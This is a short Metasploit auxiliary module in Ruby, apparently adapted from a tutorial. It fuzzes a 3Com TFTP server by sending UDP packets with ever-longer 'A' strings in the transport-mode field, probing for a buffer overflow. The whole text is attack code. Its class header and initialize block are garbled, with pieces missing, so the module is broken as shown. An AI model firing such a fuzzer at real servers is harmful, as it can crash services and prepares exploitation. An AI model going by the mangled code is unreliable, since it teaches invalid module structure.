#Metasploit
require 'msf/core'
class Metasploit3  '3Com TFTP Fuzzer',(
        'Version'        => '$Revision: 1 $',
        'Description'    => '3Com TFTP Fuzzer Passes Overly Long Transport Mode String',
        'Author'         => 'Your name here',
        'License'        => MSF_LICENSE
      )
      register_options( [
      Opt::RPORT(69)
      ], self.class)
    end
    def run_host(ip)# Create an unbound UDP socket
      udp_sock = Rex::Socket::Udp.create(
        'Context'   =>
          {
            'Msf'        => framework,
            'MsfExploit' => self,
          }
      )
      count = 10  # Set an initial count
      while count < 2000  # While the count is under 2000 run
        evil = "A" * count  # Set a number of "A"s equal to count
        pkt = "\x00\x02" + "\x41" + "\x00" + evil + "\x00"  # Define the payload
        udp_sock.sendto(pkt, ip, datastore['RPORT'])  # Send the packet
        print_status("Sending: #{evil}")  # Status update
        resp = udp_sock.get(1)  # Capture the response
        count += 10  # Increase count by 10, and loop
      end
    end
end
